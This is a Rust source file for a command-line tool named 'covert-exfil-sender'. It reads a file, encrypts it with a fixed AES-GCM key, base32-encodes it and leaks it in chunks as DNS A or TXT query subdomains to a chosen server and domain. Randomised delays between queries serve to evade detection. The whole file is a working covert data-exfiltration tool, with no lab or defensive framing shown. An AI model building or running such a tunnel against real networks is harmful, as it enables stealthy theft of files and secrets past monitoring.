use anyhow::{Context, Result};
use clap::Parser;
use covert_core::{
    encoding::to_base32,
    rate_limit::jittered_delay,
    encrypt_aes_gcm,
};
use hickory_client::client::{Client, ClientHandle};
use hickory_proto::{
    rr::{DNSClass, Name, RecordType},
    udp::UdpClientStream,
};
use hickory_client::proto::runtime::TokioRuntimeProvider;
use rand::{rngs::OsRng, RngCore};
use std::net::SocketAddr;
use std::time::Instant;
use tokio::time::Duration;

#[derive(Parser)]
#[command(name = "covert-exfil-sender", version = "2026.03")]
struct Args {
    #[arg(short, long, default_value = "secret.txt")]
    file: String,
    #[arg(short, long, default_value = "dns")]
    mode: String,
    #[arg(long, default_value = "127.0.0.1:5371")]
    server: String,
    #[arg(long, default_value = "exfil.example.zone.")]
    domain: String,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    println!("=== Covert Exfil Sender 2026 ===");
    println!("Target: {} | Mode: {} | Domain: {}", args.server, args.mode, args.domain);

    let payload = std::fs::read(&args.file)
        .with_context(|| format!("Failed to read file: {}", args.file))?;

    let key = [42u8; 32];
    let mut nonce = [0u8; 12];
    OsRng.fill_bytes(&mut nonce);

    let ciphertext = encrypt_aes_gcm(&payload, &key, &nonce)
        .context("AES-GCM encryption failed")?;

    let mut full_payload = Vec::with_capacity(nonce.len() + ciphertext.len());
    full_payload.extend_from_slice(&nonce);
    full_payload.extend_from_slice(&ciphertext);

    let encoded = to_base32(&full_payload);
    println!(
        "Payload size: {} → encrypted+nonce: {} → base32: {} chars (~{} chunks)",
        payload.len(),
        full_payload.len(),
        encoded.len(),
        (encoded.len() + 55) / 56
    );

    let server_addr: SocketAddr = args.server.parse()
        .context("Invalid server address")?;
    let domain_clean = args.domain.trim_end_matches('.').to_string();

    let chars: Vec<char> = encoded.chars().collect();
    let chunks: Vec<String> = chars
        .chunks(56)
        .map(|chunk| chunk.iter().collect())
        .collect();

    let start = Instant::now();
    let mut success_count = 0;
    let mut fail_count = 0;

    for (i, chunk) in chunks.iter().enumerate() {
        let subdomain = chunk.clone();  // ← без индекса
        let name_str = format!("{}.{}", subdomain, domain_clean);
        let name = Name::from_ascii(&name_str)
            .with_context(|| format!("Invalid name: {}", name_str))?;

        let is_txt_mode = args.mode.eq_ignore_ascii_case("txt");
        let query_type = if is_txt_mode { RecordType::TXT } else { RecordType::A };

        let ok = send_dns_query(&server_addr, &name, query_type).await;

        if ok {
            success_count += 1;
            println!("Chunk {:3}/{:3} sent ({:3} chars)", i + 1, chunks.len(), chunk.len());
        } else {
            fail_count += 1;
            eprintln!("Chunk {:3}/{:3} FAILED", i + 1, chunks.len());
        }

        jittered_delay(400, 1800).await;
    }

    let duration = start.elapsed();
    println!(
        "Exfiltration finished in {:.2}s | Success: {} / Fail: {} | Chunks: {}",
        duration.as_secs_f64(),
        success_count,
        fail_count,
        chunks.len()
    );

    Ok(())
}

async fn send_dns_query(server: &SocketAddr, name: &Name, rectype: RecordType) -> bool {
    let stream = UdpClientStream::builder(*server, TokioRuntimeProvider::new()).build();
    let (mut client, bg) = match Client::connect(stream).await {
        Ok(res) => res,
        Err(e) => {
            eprintln!("Client connect failed: {}", e);
            return false;
        }
    };
    tokio::spawn(bg);

    match client.query(name.clone(), DNSClass::IN, rectype).await {
        Ok(_) => true,
        Err(e) => {
            eprintln!("Query failed: {}", e);
            false
        }
    }
}